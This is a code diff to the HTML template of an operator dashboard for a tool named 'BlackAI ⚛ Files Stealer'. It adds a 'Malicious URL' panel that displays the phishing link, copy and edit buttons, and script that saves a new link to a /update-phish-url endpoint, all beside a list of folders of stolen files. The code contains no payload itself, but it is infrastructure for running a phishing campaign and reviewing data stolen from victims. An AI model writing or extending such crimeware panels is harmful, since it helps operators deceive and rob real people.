@@ -61,11 +61,66 @@
             margin-top: 60px;
             font-size: 18px;
         }
+        .url-section {
+            background: #000;
+            padding: 8px 12px;
+            border-radius: 0;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .url-section h2 {
+            margin: 0 0 6px 0;
+            font-size: 13px;
+            font-weight: normal;
+            color: #ccc;
+        }
+        .url-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .url-input {
+            width: 260px;
+            flex: none;
+            padding: 4px 8px;
+            font-size: 11px;
+            border-radius: 3px;
+            border: 1px solid #ccc;
+            background: #fff;
+            color: #000;
+        }
+        .url-input:read-only {
+            background: #fff;
+        }
+        .btn-copy, .btn-edit-url {
+            padding: 4px 10px;
+            border: none;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: bold;
+            color: white;
+            background: #b71c1c;
+            cursor: pointer;
+        }
+        .btn-copy:hover, .btn-edit-url:hover {
+            background: #d32f2f;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>BlackAI ⚛ Files Stealer</h1>
+
+        <div class="url-section">
+            <h2>Malicious URL</h2>
+            <div class="url-row">
+                <input type="text" id="phishUrl" class="url-input" value="{{ phish_url }}" readonly>
+                <button class="btn-copy" onclick="copyUrl()">Copy URL</button>
+                <button class="btn-edit-url" id="editBtn" onclick="toggleEdit()">Edit URL</button>
+            </div>
+        </div>
+
         {% if folders %}
             {% for folder in folders %}
             <div class="folder-card">
@@ -83,5 +138,41 @@
             <p class="empty">No stealed files yet.</p>
         {% endif %}
     </div>
+
+    <script>
+        function copyUrl() {
+            const input = document.getElementById('phishUrl');
+            navigator.clipboard.writeText(input.value).then(() => {
+                const btn = document.querySelector('.btn-copy');
+                btn.textContent = 'Copied!';
+                setTimeout(() => btn.textContent = 'Copy URL', 2000);
+            });
+        }
+
+        let editing = false;
+        function toggleEdit() {
+            const input = document.getElementById('phishUrl');
+            const btn = document.getElementById('editBtn');
+            if (!editing) {
+                input.removeAttribute('readonly');
+                input.focus();
+                btn.textContent = 'Save URL';
+                editing = true;
+            } else {
+                const newUrl = input.value.trim();
+                fetch('/update-phish-url', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({url: newUrl})
+                }).then(res => {
+                    if (res.ok) {
+                        input.setAttribute('readonly', true);
+                        btn.textContent = 'Edit URL';
+                        editing = false;
+                    }
+                });
+            }
+        }
+    </script>
 </body>
 </html>
